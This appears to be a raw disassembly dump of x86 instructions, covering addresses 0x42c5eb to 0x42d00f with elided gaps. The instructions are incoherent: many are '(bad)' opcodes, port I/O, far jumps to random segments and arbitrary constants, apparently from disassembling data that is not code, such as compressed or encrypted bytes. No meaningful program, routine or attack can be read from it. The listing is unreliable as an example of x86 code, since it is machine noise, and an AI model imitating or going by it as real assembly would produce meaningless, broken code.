  42c5eb:	stc    
  42c5ec:	loopne 0x42c59b
  42c5ee:	cmp    eax,DWORD PTR [edx+0x17]
  42c5f1:	jge    0x42c648
  42c5f3:	cmp    al,0x38
  42c5f5:	sar    BYTE PTR [edi+eiz*8-0x636bce53],1
  42c5fc:	js     0x42c65b
  42c5fe:	cmp    BYTE PTR [ebx+0x4],dl
  42c601:	push   0x8e195116
  42c606:	call   0xb4d2d73b
  42c60b:	cmp    ch,BYTE PTR [ecx-0x43]
  42c60e:	stos   DWORD PTR es:[edi],eax
  42c60f:	push   0xa7c81857
  42c614:	mov    al,BYTE PTR [esi+0x55]
  42c617:	adc    eax,0xb73c0c45
  42c61c:	clc    
  42c61d:	or     ah,dl
  42c61f:	(bad)  
  42c621:	cdq    
  42c622:	push   esi
  42c623:	mov    ecx,0x4d72b93b
  42c628:	push   es
  42c629:	test   DWORD PTR [eax],0x2d97bffa
  42c62f:	ror    BYTE PTR [ecx],1
  42c631:	add    al,al
  42c633:	sbb    ebx,DWORD PTR [esi-0x38121eef]
  42c639:	or     eax,0x33d8b123
  42c63e:	fistp  DWORD PTR [ebx]
  42c640:	cdq    
  42c641:	pop    esp
  42c642:	aaa    
  42c643:	cmp    DWORD PTR [esi+eiz*4-0x3c],edi
  42c647:	sub    DWORD PTR [ebx],ebp
  42c649:	imul   esi,DWORD PTR [edi-0x3d],0x95d32025
  42c650:	icebp  
  42c651:	jle    0x42c6b1
  42c653:	or     al,0x2c
  42c655:	stos   BYTE PTR es:[edi],al
  42c656:	aas    
  42c657:	ja     0x42c66e
  42c659:	(bad)  
  42c65a:	sbb    esi,DWORD PTR [esi]
  42c65c:	test   eax,0x820aac4c
  42c661:	dec    edi
  42c662:	std    
  42c663:	in     eax,0x6b
  42c665:	sahf   
  42c666:	xchg   DWORD PTR [ebp-0x3e],ecx
  42c669:	cdq    
  42c66a:	push   es
  42c66b:	stos   BYTE PTR es:[edi],al
  42c66c:	xchg   BYTE PTR [eax+eax*1+0x0],ch
	...
  42c6d4:	add    BYTE PTR [eax],al
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx+0x616dfc6b]
  42c6e3:	and    eax,0xdc670b02
  42c6e8:	add    DWORD PTR [eax],eax
  42c6ea:	add    BYTE PTR [ecx],al
  42c6ec:	add    BYTE PTR [eax],al
  42c6ee:	sub    cl,BYTE PTR [ebp+esi*8+0x4df55302]
  42c6f5:	push   ebx
  42c6f6:	inc    ecx
  42c6f7:	neg    DWORD PTR [ebp+0x56801840]
  42c6fd:	int3   
  42c6fe:	pop    esp
  42c6ff:	pushf  
  42c700:	and    DWORD PTR [esi+esi*4-0x390e8f70],ebx
  42c707:	mov    esi,cs
  42c709:	jne    0x42c69c
  42c70b:	adc    BYTE PTR [esi],bl
  42c70d:	mov    ebx,0xbd12c0e5
  42c712:	sahf   
  42c713:	sbb    edx,DWORD PTR [ebx+0x7b]
  42c716:	sub    DWORD PTR [edi],0xffffffb7
  42c719:	dec    ecx
  42c71a:	xor    bl,cl
  42c71c:	dec    ebx
  42c71d:	pushf  
  42c71e:	mov    ecx,0x53a65d68
  42c723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c724:	jmp    0x42c6ee
  42c726:	sub    BYTE PTR [edi],al
  42c728:	(bad)  
  42c729:	ins    DWORD PTR es:[edi],dx
  42c72a:	xchg   BYTE PTR [edi+0x0],cl
  42c72d:	xor    cl,BYTE PTR ds:0x97df76d0
  42c733:	fisubr DWORD PTR [ebx+edx*4]
  42c736:	lahf   
  42c737:	add    cl,ch
  42c739:	cmc    
  42c73a:	inc    esi
  42c73b:	mov    bh,0xb3
  42c73d:	cmp    DWORD PTR [edx+0x7bd93349],esi
  42c743:	jnp    0x42c716
  42c745:	push   ss
  42c746:	push   ecx
  42c747:	xlat   BYTE PTR ds:[ebx]
  42c748:	inc    ebx
  42c749:	sub    dl,al
  42c74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c74c:	pcmpeqw mm4,mm2
  42c74f:	jo     0x42c7c1
  42c751:	dec    ebp
  42c752:	mov    WORD PTR [ebp+0x11],ds
  42c755:	int    0x2c
  42c757:	sub    edi,edi
  42c759:	adc    esi,ecx
  42c75b:	pop    ecx
  42c75c:	adc    dl,BYTE PTR [edi+0x48b18caf]
  42c762:	rol    DWORD PTR [edx+0x61aafc30],1
  42c768:	outs   dx,DWORD PTR ds:[esi]
  42c769:	loop   0x42c7a0
  42c76b:	adc    al,0x60
  42c76d:	popa   
  42c76e:	jmp    0xefd1:0xca23efde
  42c775:	inc    ebx
  42c776:	bound  eax,QWORD PTR [edi]
  42c778:	out    0xe2,eax
  42c77a:	mov    esp,0x96c7e711
  42c77f:	xor    DWORD PTR [ebx],0x13992567
  42c785:	or     al,0xff
  42c787:	xchg   ecx,eax
  42c788:	out    0xe5,al
  42c78a:	push   fs
  42c78c:	mov    dl,0x53
  42c78e:	js     0x42c721
  42c790:	mov    al,0x63
  42c792:	les    esp,FWORD PTR [ecx+0x10012a28]
  42c798:	sbb    al,0x72
  42c79a:	cmc    
  42c79b:	in     al,0xb2
  42c79d:	(bad)  
  42c79e:	out    dx,eax
  42c79f:	sub    eax,0x4900271a
  42c7a4:	mov    ebx,0x26f2125d
  42c7a9:	dec    ebx
  42c7aa:	inc    ebp
  42c7ab:	pop    es
  42c7ac:	dec    edi
  42c7ad:	add    BYTE PTR [edx-0x33c0a13d],bh
  42c7b3:	in     al,dx
  42c7b4:	inc    ebx
  42c7b5:	enter  0x3630,0x3f
  42c7b9:	into   
  42c7ba:	xchg   DWORD PTR [eax],edi
  42c7bc:	jne    0x42c808
  42c7be:	fsub   DWORD PTR [edx]
  42c7c0:	inc    esi
  42c7c1:	lods   al,BYTE PTR ds:[esi]
  42c7c2:	mov    eax,0x6d8964dc
  42c7c7:	dec    edi
  42c7c8:	mov    ah,0x37
  42c7ca:	leave  
  42c7cb:	jmp    0x42c820
  42c7cd:	cld    
  42c7ce:	push   ecx
  42c7cf:	pop    esi
  42c7d0:	hlt    
  42c7d1:	jns    0x42c830
  42c7d3:	gs ret 
  42c7d5:	mov    esp,0x8ff8ac68
  42c7da:	inc    ebx
  42c7db:	fidiv  WORD PTR [ebx+edx*2+0x6d]
  42c7df:	jnp    0x42c772
  42c7e1:	and    bl,BYTE PTR [eax+ebp*1]
  42c7e4:	inc    edx
  42c7e5:	ins    BYTE PTR es:[edi],dx
  42c7e6:	cli    
  42c7e7:	cld    
  42c7e8:	nop
  42c7e9:	nop
  42c7ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c7eb:	sbb    bl,ch
  42c7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	into   
  42c863:	cld    
  42c864:	ret    
  42c865:	clc    
  42c866:	fld    QWORD PTR [bx+di]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    BYTE PTR [edx],bh
  42c86f:	dec    ebx
  42c870:	aaa    
  42c871:	or     ebp,DWORD PTR [ebx-0x6c]
  42c874:	outs   dx,BYTE PTR ds:[esi]
  42c875:	push   ss
  42c876:	(bad)  
  42c877:	lds    ebp,FWORD PTR [ebx-0x8]
  42c87a:	int    0xc0
  42c87c:	in     al,dx
  42c87d:	xor    al,0x90
  42c87f:	lahf   
  42c880:	ret    0x3edc
  42c883:	xchg   esi,eax
  42c884:	fnstcw WORD PTR [ecx+edx*2-0x35]
  42c888:	daa    
  42c889:	repz cmp BYTE PTR [eax],dl
  42c88c:	aaa    
  42c88d:	sbb    ch,ch
  42c88f:	in     eax,0x92
  42c891:	js     0x42c894
  42c893:	xchg   esi,eax
  42c894:	xchg   esi,eax
  42c895:	sbb    eax,0xbc6961a0
  42c89a:	dec    edx
  42c89b:	pop    esi
  42c89c:	out    dx,al
  42c89d:	sbb    cl,BYTE PTR [ebp+0x101a1fc4]
  42c8a3:	shl    DWORD PTR [edx-0x55],0xac
  42c8a7:	nop
  42c8a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8a9:	and    al,0xa5
  42c8ab:	jmp    ebp
  42c8ad:	and    esi,DWORD PTR [esi+0x1b]
  42c8b0:	pop    eax
  42c8b1:	sub    al,BYTE PTR [ecx+0x59]
  42c8b4:	(bad)  
  42c8b6:	and    DWORD PTR [eax+0x64],ebp
  42c8b9:	jns    0x42c889
  42c8bb:	xchg   edi,eax
  42c8bc:	sbb    ecx,DWORD PTR [edx+0x1d0e393a]
  42c8c2:	dec    DWORD PTR [ecx]
  42c8c4:	jb     0x42c8cc
  42c8c6:	cmp    edi,edi
  42c8c8:	and    esp,DWORD PTR [esi+0x20]
  42c8cb:	outs   dx,BYTE PTR ds:[esi]
  42c8cc:	cmp    eax,eax
  42c8ce:	cs pusha 
  42c8d0:	outs   dx,DWORD PTR ds:[esi]
  42c8d1:	fs into 
  42c8d3:	arpl   WORD PTR ds:0x3a4eff9,cx
  42c8d9:	hlt    
  42c8da:	in     eax,0x88
  42c8dc:	mov    esp,0x927ac6b8
  42c8e1:	mov    ebx,0x54334668
  42c8e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8e7:	enter  0x74c0,0x59
  42c8eb:	pop    ss
  42c8ec:	cmp    DWORD PTR [ecx-0x42],0x1fd1eac8
  42c8f3:	xchg   ebx,eax
  42c8f4:	clc    
  42c8f5:	aas    
  42c8f6:	add    BYTE PTR [edx],cl
  42c8f8:	pop    eax
  42c8f9:	clc    
  42c8fa:	(bad)  
  42c8fb:	std    
  42c8fc:	mov    ebx,0xadbc2cf0
  42c901:	sub    bl,BYTE PTR [ebx]
  42c903:	or     dl,BYTE PTR [ebp+0x41]
  42c906:	push   ds
  42c907:	or     DWORD PTR [esp+eax*2+0x1fe98e5d],ebx
  42c90e:	sub    edi,DWORD PTR [eax-0x1]
  42c911:	lock mov al,ss:0x4d341268
  42c918:	pop    ebx
  42c919:	imul   DWORD PTR [edx+0x54]
  42c91c:	mov    BYTE PTR [edx],cl
  42c91e:	daa    
  42c91f:	int3   
  42c920:	cli    
  42c921:	xor    eax,0x3febbe32
  42c926:	push   ecx
  42c927:	xchg   edi,eax
  42c928:	push   esp
  42c929:	int    0x61
  42c92b:	retf   0x4d23
  42c92e:	(bad)  
  42c92f:	fcomp  QWORD PTR [edx+0x7583eae9]
  42c935:	push   ebx
  42c936:	cmp    DWORD PTR [esi+ecx*1],esp
  42c939:	jmp    0xf8ff:0x474f9aa0
  42c940:	mov    ebp,0xd90b4479
  42c945:	and    eax,0xd6c4a982
  42c94a:	sub    ah,bh
  42c94c:	inc    ebp
  42c94d:	and    eax,0xf0351db
  42c952:	jp     0x42c99b
  42c954:	mov    bl,0x65
  42c956:	call   0x2fc0:0x7362ddfb
  42c95d:	cdq    
  42c95e:	(bad)  
  42c95f:	cmp    bl,dh
  42c961:	push   0xffffffaa
  42c963:	in     al,dx
  42c964:	sar    DWORD PTR [edi+0x3638ce8c],0x55
  42c96b:	push   esi
  42c96c:	mov    ebp,0x88
	...
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x2573816b
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    bh,al
  42c9ef:	jne    0x42c9e1
  42c9f1:	inc    ecx
  42c9f2:	jl     0x42c990
  42c9f4:	dec    ebx
  42c9f5:	jb     0x42c994
  42c9f7:	push   0xffffff89
  42c9f9:	and    BYTE PTR [edi],0xad
  42c9fc:	add    al,0xfc
  42c9fe:	lea    ebx,[eax-0x3f]
  42ca01:	ffree  st(2)
  42ca03:	aas    
  42ca04:	in     eax,0xd
  42ca06:	dec    esi
  42ca07:	fst    DWORD PTR [eiz*1-0xfae50e9]
  42ca0e:	es mov edx,0x35d1f521
  42ca14:	jmp    0x42c9a1
  42ca16:	pop    esp
  42ca17:	scas   al,BYTE PTR es:[edi]
  42ca18:	adc    DWORD PTR [edi-0x19],edx
  42ca1b:	add    eax,esi
  42ca1d:	and    eax,0x1a540bf5
  42ca22:	repnz adc al,BYTE PTR ds:0xb1edcdec
  42ca29:	jp     0x42c9b4
  42ca2b:	xchg   edi,eax
  42ca2c:	inc    ebx
  42ca2d:	dec    ebx
  42ca2e:	lock and edi,ebp
  42ca31:	mov    eax,0x188cb1f1
  42ca36:	fistp  DWORD PTR [edi-0x4a2f258c]
  42ca3c:	jmp    0xc721e09e
  42ca41:	cmp    DWORD PTR [ebx],0x33
  42ca44:	jl     0x42cab7
  42ca46:	rcl    DWORD PTR [eax-0x40a443a5],cl
  42ca4c:	push   edi
  42ca4d:	add    al,0x79
  42ca4f:	mov    cl,0xf9
  42ca51:	mov    ah,0xf7
  42ca53:	sub    edi,esi
  42ca55:	out    dx,al
  42ca56:	jns    0x42ca3d
  42ca58:	fxch   st(5)
  42ca5a:	ficomp WORD PTR [esi+0x118eb812]
  42ca60:	jmp    0x21aa0ff4
  42ca65:	pop    ebp
  42ca66:	aas    
  42ca67:	ror    DWORD PTR [ecx+0x4dd6aac0],1
  42ca6d:	mov    bl,0xbf
  42ca6f:	lock inc edi
  42ca71:	fld    QWORD PTR [edx-0x7f72a261]
  42ca77:	add    al,0x8d
  42ca79:	sbb    eax,0x24591b60
  42ca7e:	push   ebp
  42ca7f:	xchg   esi,eax
  42ca80:	dec    ecx
  42ca81:	xor    DWORD PTR [ecx],ebx
  42ca83:	dec    ecx
  42ca84:	adc    DWORD PTR [ebx],ebp
  42ca86:	jmp    0x42ca48
  42ca88:	jb     0x42ca2a
  42ca8a:	leave  
  42ca8b:	mov    edx,0xbb34cd1f
  42ca90:	jae    0x42ca2b
  42ca92:	adc    ch,ah
  42ca94:	adc    al,0x15
  42ca96:	fwait
  42ca97:	jne    0x42cae6
  42ca99:	sti    
  42ca9a:	je     0x42ca3a
  42ca9c:	adc    eax,0x16423708
  42caa1:	and    eax,0x6a15dde4
  42caa6:	test   eax,0x9514a366
  42caac:	rcr    ebx,cl
  42caae:	or     edx,0x62
  42cab1:	fild   WORD PTR [ebp-0x1a99c7d9]
  42cab7:	aas    
  42cab8:	(bad)  
  42cab9:	jbe    0x42cabf
  42cabb:	xor    dh,BYTE PTR [ebx-0x34d41d71]
  42cac1:	in     al,0xa
  42cac3:	shl    BYTE PTR [esi+eiz*4-0x7e642eaf],0x23
  42cacb:	adc    al,0x8c
  42cacd:	mov    ds:0xb5287df8,eax
  42cad2:	std    
  42cad3:	mov    ecx,esi
  42cad5:	jle    0x42ca9e
  42cad7:	fistp  DWORD PTR [eax]
  42cad9:	and    eax,0x7497c50f
  42cade:	sbb    ebp,DWORD PTR [edi+0x5]
  42cae1:	jno    0x42ca9a
  42cae3:	mov    edx,0x621b981e
  42cae8:	(bad)
  42caec:	in     al,dx
  42caed:	fwait
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp+0x31ed6ec0]
  42cb64:	add    BYTE PTR [edi+eiz*2+0x1df],bl
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    dl,dl
  42cb6f:	push   esp
  42cb70:	repz lock mov esp,0xb625b076
  42cb77:	jge    0x42cb20
  42cb79:	push   ebp
  42cb7a:	(bad)  
  42cb7b:	fistp  QWORD PTR ds:0xfb08b11f
  42cb81:	retf   
  42cb82:	xor    al,BYTE PTR ds:0x6f74a03a
  42cb88:	sbb    eax,0x3d69756a
  42cb8d:	in     al,dx
  42cb8e:	jle    0x42cb64
  42cb90:	retf   0x2945
  42cb93:	adc    eax,0x57ca0a48
  42cb98:	syscall 
  42cb9a:	vhaddpd ymm1,ymm6,ymm5
  42cb9e:	loop   0x42cc0a
  42cba0:	jmp    0xf10fd15e
  42cba5:	je     0x42cb55
  42cba7:	mov    ebx,0xcafef8d7
  42cbac:	mov    eax,0x53140e95
  42cbb1:	xor    cl,BYTE PTR [esi+0xba630d0]
  42cbb7:	sub    DWORD PTR [ebx+0x21],0xc764b038
  42cbbe:	cmp    al,0x71
  42cbc0:	repz fwait
  42cbc2:	outs   dx,DWORD PTR ds:[esi]
  42cbc3:	add    BYTE PTR gs:[ebx-0x590d2480],bh
  42cbca:	jle    0x42cc22
  42cbcc:	stos   DWORD PTR es:[edi],eax
  42cbcd:	mov    cl,0xc9
  42cbcf:	inc    ebx
  42cbd0:	imul   esi,DWORD PTR [edi-0x73],0x4ed3b2a
  42cbd7:	and    dl,BYTE PTR [ebp-0x1229a23b]
  42cbdd:	push   cs
  42cbde:	data16 aaa 
  42cbe0:	out    0xbf,al
  42cbe2:	daa    
  42cbe3:	add    BYTE PTR [edx+0x16],dh
  42cbe6:	push   es
  42cbe7:	ss out 0xb3,al
  42cbea:	inc    edx
  42cbeb:	pop    ss
  42cbec:	aas    
  42cbed:	adc    bl,BYTE PTR [esi]
  42cbef:	js     0x42cc38
  42cbf1:	imul   eax,esi,0xa0791b74
  42cbf7:	ror    DWORD PTR [eax+0x5e],1
  42cbfa:	mov    eax,0x28efcc55
  42cbff:	cmp    al,0x8b
  42cc01:	push   cs
  42cc02:	in     al,dx
  42cc03:	and    al,0xd6
  42cc05:	sub    DWORD PTR [edx-0x47bf3312],eax
  42cc0b:	xchg   edx,eax
  42cc0c:	cmp    al,0x50
  42cc0e:	xlat   BYTE PTR ds:[ebx]
  42cc0f:	js     0x42cc31
  42cc11:	fst    st(0)
  42cc13:	into   
  42cc14:	push   ebx
  42cc15:	push   edi
  42cc16:	jne    0x42cc89
  42cc18:	jae    0x42cbdf
  42cc1a:	push   esp
  42cc1b:	scas   eax,DWORD PTR es:[edi]
  42cc1c:	pushf  
  42cc1d:	jmp    0xa187622d
  42cc22:	xchg   DWORD PTR [ebp+0x3f65d931],edi
  42cc28:	lods   al,BYTE PTR ds:[esi]
  42cc29:	ret    0x83ad
  42cc2c:	(bad)  
  42cc2d:	fbstp  TBYTE PTR [edi-0x13]
  42cc30:	xchg   ebp,eax
  42cc31:	enter  0x91a7,0x27
  42cc35:	ret    0x28a0
  42cc38:	add    eax,0x26dd799b
  42cc3d:	mov    ebp,0x3de7f299
  42cc42:	jno    0x42cc55
  42cc44:	mov    edx,0x9d242743
  42cc49:	scas   eax,DWORD PTR es:[edi]
  42cc4a:	sbb    DWORD PTR [ebx+0x7d],eax
  42cc4d:	mov    ah,0x5c
  42cc4f:	cld    
  42cc50:	dec    ebp
  42cc51:	scas   eax,DWORD PTR es:[edi]
  42cc52:	(bad)  
  42cc54:	ins    BYTE PTR es:[edi],dx
  42cc55:	push   ss
  42cc56:	push   0x52fae4d1
  42cc5b:	or     DWORD PTR [ecx-0x3b],eax
  42cc5e:	sti    
  42cc5f:	mov    BYTE PTR [edx],al
  42cc61:	in     al,dx
  42cc62:	gs xor eax,0x7102f998
  42cc68:	mov    ch,0x26
  42cc6a:	jmp    0xa9d374
	...
  42ccd3:	add    BYTE PTR [eax],al
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x348e18d2
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [ecx],cl
  42ccef:	or     ebp,0x2bcb4d37
  42ccf5:	dec    esp
  42ccf6:	sbb    al,BYTE PTR [ebx]
  42ccf8:	push   0xffffffa6
  42ccfa:	adc    DWORD PTR [esi+0x7f43fa],esp
  42cd00:	lahf   
  42cd01:	jno    0x42cd6b
  42cd03:	imul   edx,DWORD PTR [ebx+0x55],0xfa47c0c1
  42cd0a:	int    0x17
  42cd0c:	clc    
  42cd0d:	and    bl,ah
  42cd0f:	fsubr  DWORD PTR [edx+0x25e01f46]
  42cd15:	mov    bl,dl
  42cd17:	fidiv  DWORD PTR [esi]
  42cd19:	xor    al,BYTE PTR [edx+0x4c]
  42cd1c:	aas    
  42cd1d:	cmp    bh,BYTE PTR [ebx-0x706bc556]
  42cd23:	int    0x84
  42cd25:	rcl    DWORD PTR [eax-0x62ab1b0c],1
  42cd2b:	and    ch,al
  42cd2d:	ja     0x42cd7f
  42cd2f:	add    esi,DWORD PTR [ecx]
  42cd31:	rcr    BYTE PTR [edx+0x4de076a9],cl
  42cd37:	hlt    
  42cd38:	and    al,0x3b
  42cd3a:	jno    0x42cd88
  42cd3c:	lea    esp,[eax+0xf]
  42cd3f:	sub    eax,0xe0b00466
  42cd44:	xchg   ecx,eax
  42cd45:	inc    esp
  42cd46:	cmp    edx,DWORD PTR [ecx+ebp*4+0x532cd0a8]
  42cd4d:	nop
  42cd4e:	jne    0x42cd08
  42cd50:	push   0x6ab02d92
  42cd55:	(bad)  
  42cd56:	in     al,dx
  42cd57:	pop    esi
  42cd58:	mov    BYTE PTR [esi-0x55],ch
  42cd5b:	xlat   BYTE PTR ds:[ebx]
  42cd5c:	jl     0x42cd39
  42cd5e:	js     0x42cd83
  42cd60:	push   es
  42cd61:	nop
  42cd62:	mov    BYTE PTR [esi-0x1c92e6d9],dl
  42cd68:	add    bh,BYTE PTR [ebx]
  42cd6a:	jmp    0xc726:0xc59f3426
  42cd71:	sti    
  42cd72:	add    DWORD PTR [esi-0x67b7952c],0x4e
  42cd79:	data16 fild WORD PTR [edx-0x6b]
  42cd7d:	xchg   edx,eax
  42cd7e:	(bad)  
  42cd7f:	xchg   ebx,eax
  42cd80:	mov    ebp,0x9933ce4a
  42cd85:	sub    al,BYTE PTR [esi+0x88da7a9]
  42cd8b:	and    al,dh
  42cd8d:	mov    esi,0x63161aa1
  42cd92:	jb     0x42cdb8
  42cd94:	mov    dl,bl
  42cd96:	push   edx
  42cd97:	scas   eax,DWORD PTR es:[edi]
  42cd98:	add    DWORD PTR [ecx],ecx
  42cd9a:	into   
  42cd9b:	je     0x42ce0a
  42cd9d:	sub    bl,BYTE PTR [ebx]
  42cd9f:	sbb    DWORD PTR [esp+ebx*4+0x27],0x26baf909
  42cda7:	mov    edx,0x7a40630c
  42cdac:	dec    esi
  42cdad:	or     ch,BYTE PTR [eax+0x55]
  42cdb0:	and    al,0xbd
  42cdb2:	sbb    cl,0x5d
  42cdb5:	xchg   DWORD PTR [eax+0x205e12c8],eax
  42cdbb:	pop    edx
  42cdbc:	mov    ecx,ebp
  42cdbe:	mov    dh,0x4b
  42cdc0:	fidiv  DWORD PTR [eax+0x3]
  42cdc3:	retf   0x3e76
  42cdc6:	add    al,0xea
  42cdc8:	shl    DWORD PTR [ebx+ebx*4-0x55decab0],0x64
  42cdd0:	std    
  42cdd1:	mov    ch,0xac
  42cdd3:	mov    bl,0xbd
  42cdd5:	push   0x78b03639
  42cdda:	fwait
  42cddb:	lahf   
  42cddc:	sbb    eax,0x7086c4b1
  42cde1:	xor    al,al
  42cde3:	mov    bl,0x56
  42cde5:	ins    BYTE PTR es:[edi],dx
  42cde6:	jns    0x42cdc2
  42cde8:	add    DWORD PTR ss:[esi+0xe3c8c8],esp
	...
  42ce53:	add    BYTE PTR [eax],al
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0x34
  42ce63:	or     edi,esi
  42ce65:	iret   
  42ce66:	addr16 loope 0x42ce6a
  42ce69:	add    BYTE PTR [eax],al
  42ce6b:	add    DWORD PTR [eax],eax
  42ce6d:	add    bl,cl
  42ce6f:	mov    bh,0x9e
  42ce71:	adc    eax,DWORD PTR [ecx-0x3e]
  42ce74:	pop    eax
  42ce75:	push   es
  42ce76:	sti    
  42ce77:	xchg   edx,eax
  42ce78:	aam    0xa3
  42ce7a:	popf   
  42ce7b:	js     0x42ce33
  42ce7d:	scas   eax,DWORD PTR es:[edi]
  42ce7e:	pminsw mm6,QWORD PTR ds:0xde49bcbc
  42ce85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce86:	jbe    0x42cef3
  42ce88:	sbb    BYTE PTR [ecx],dl
  42ce8a:	cmp    eax,0xd40e9821
  42ce8f:	aam    0x78
  42ce91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ce92:	out    0xcb,eax
  42ce94:	adc    bh,ch
  42ce96:	push   ecx
  42ce97:	mov    esp,0x32a7ff2
  42ce9c:	pushf  
  42ce9d:	add    ah,dl
  42ce9f:	ins    BYTE PTR es:[edi],dx
  42cea0:	retf   0x6876
  42cea3:	dec    edx
  42cea4:	scas   al,BYTE PTR es:[edi]
  42cea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cea6:	inc    ebx
  42cea7:	std    
  42cea8:	in     eax,dx
  42cea9:	push   edi
  42ceaa:	pop    ecx
  42ceab:	call   0x3866:0xb715b3b9
  42ceb2:	sub    dl,al
  42ceb4:	and    eax,eax
  42ceb6:	xor    eax,0xd47219c6
  42cebb:	fs adc eax,0x80b6ae79
  42cec1:	dec    ecx
  42cec2:	hlt    
  42cec3:	push   eax
  42cec4:	mov    edi,eax
  42cec6:	pop    ss
  42cec7:	pop    ecx
  42cec8:	xor    BYTE PTR [edi],dl
  42ceca:	iret   
  42cecb:	push   esp
  42cecc:	cld    
  42cecd:	call   0x942cd755
  42ced2:	push   eax
  42ced3:	stos   DWORD PTR es:[edi],eax
  42ced4:	aad    0xc4
  42ced6:	xchg   ecx,eax
  42ced7:	loop   0x42cee9
  42ced9:	inc    ecx
  42ceda:	outs   dx,BYTE PTR ds:[esi]
  42cedb:	inc    eax
  42cedc:	jno    0x42ce8c
  42cede:	mov    WORD PTR [eax],ss
  42cee0:	push   cs
  42cee1:	pop    edx
  42cee2:	mov    ch,0x70
  42cee4:	scas   al,BYTE PTR es:[edi]
  42cee5:	aad    0xea
  42cee7:	jnp    0x42cefc
  42cee9:	fbstp  TBYTE PTR [edi]
  42ceeb:	xchg   ebp,eax
  42ceec:	sti    
  42ceed:	xchg   ebx,eax
  42ceee:	inc    ebp
  42ceef:	mov    DWORD PTR [ebp+0x2],0x4d83e19b
  42cef6:	mov    ds:0xa6e2ddbf,eax
  42cefb:	or     DWORD PTR [edi+0x70],esp
  42cefe:	jmp    0x997e:0x8f4085d4
  42cf05:	sub    edx,DWORD PTR [ebx-0x2e]
  42cf08:	adc    BYTE PTR ds:0xb6c14f8d,ah
  42cf0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf0f:	fcomp  DWORD PTR [ebx-0x69a8f70f]
  42cf15:	push   edx
  42cf16:	dec    ecx
  42cf17:	retf   
  42cf18:	push   cs
  42cf19:	push   ebp
  42cf1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf1b:	and    BYTE PTR [esi+edx*1-0x56],0x7a
  42cf20:	retf   0x5f11
  42cf23:	int    0x48
  42cf25:	es mov eax,0x7c5ec15b
  42cf2b:	call   DWORD PTR [eax-0x7fd1a7a5]
  42cf31:	je     0x42cf5b
  42cf33:	fwait
  42cf34:	mov    bl,0x66
  42cf36:	sub    al,0x97
  42cf38:	retf   
  42cf39:	arpl   WORD PTR [ebx],bp
  42cf3b:	sub    cl,BYTE PTR [ebp-0x78]
  42cf3e:	dec    esi
  42cf3f:	xor    BYTE PTR [ecx+0x37],bl
  42cf42:	pop    eax
  42cf43:	mov    edx,0x1126081f
  42cf48:	dec    esi
  42cf49:	add    al,0x7
  42cf4b:	mov    ch,BYTE PTR [edi-0x46ee7f44]
  42cf51:	push   ss
  42cf52:	xchg   esi,eax
  42cf53:	mov    eax,0xd34c1a0a
  42cf58:	push   cs
  42cf59:	xchg   BYTE PTR [ebp+0x1421b740],al
  42cf5f:	fistp  DWORD PTR [edx-0x52564c0b]
  42cf65:	jne    0x42cf98
  42cf67:	sub    bl,BYTE PTR [ecx]
  42cf69:	popa   
  42cf6a:	sar    BYTE PTR [eax+0xd87b],cl
	...
  42cfd4:	add    BYTE PTR [eax],al
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    edx,FWORD PTR [esi+0x67ca7c84]
  42cfe7:	loop   0x42cfea
  42cfe9:	add    BYTE PTR [eax],al
  42cfeb:	add    DWORD PTR [eax],eax
  42cfed:	add    BYTE PTR [edx+0x1d554ed9],bh
  42cff3:	xchg   edi,eax
  42cff4:	mov    eax,ds:0x74e69869
  42cff9:	outs   dx,DWORD PTR ds:[esi]
  42cffa:	mov    dh,BYTE PTR [edi-0x6a]
  42cffd:	mov    ebx,eax
  42cfff:	add    DWORD PTR [esp+edi*8-0x29],ebp
  42d003:	lea    edx,ds:0x9f01cc41
  42d009:	sbb    bh,BYTE PTR [ecx+ebp*8-0x2a]
  42d00d:	dec    eax
  42d00e:	fwait
  42d00f:	imul   ecx,DWORD PTR [eax+0x613d61dc],0xb553f798
